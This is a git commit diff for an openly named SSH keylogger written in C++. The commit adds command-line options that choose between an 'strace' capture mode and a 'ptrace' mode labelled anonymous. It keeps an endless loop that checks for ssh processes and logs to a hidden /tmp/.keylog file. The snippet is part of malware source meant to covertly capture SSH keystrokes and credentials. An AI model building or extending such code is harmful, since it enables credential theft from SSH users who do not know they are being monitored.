f6e9d1025194694698132e99593a7036883b24e2
Ваше Имя <you@example.com>
2020-02-01 12:49:50 +0200

    PTRACE-mechanism and console arguments parser

--- src/main.cpp
+++ src/main.cpp
@@ -1,6 +1,8 @@
 #include "keylogger.hpp"
 
-int main() {
+namespace po = boost::program_options;
+
+int main(int argc, char **argv) {
     const fs::path path_to_log = "/tmp/.keylog";
     int64_t sleep_time = 3;
     if(!fs::exists(path_to_log)){
@@ -8,8 +10,24 @@ int main() {
         std::cout << "DIR is created" << std::endl;
     }
 
+    options_description desc{"Options"};
+    desc.add_options()
+            ("help", "print all support info")
+            ("strace,s", "run ssh keylogger via STRACE mechanism(no anonymuous, default option)")
+            ("ptrace,p", "run ssh keylogger via PTRACE mechanism(anonymuous)");
+
+    po::variables_map vm;
+    po::store(po::parse_command_line(argc, argv, desc), vm);
+    po::notify(vm);
+
+    if (vm.count("help")) {
+       std::cout << desc << std::endl;
+        return 1;
+    }
+
     while(true){
-        check_ps();
+        if (vm.count("strace,s")) check_ps(1);
+        else check_ps(0);
         std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
     }
 }
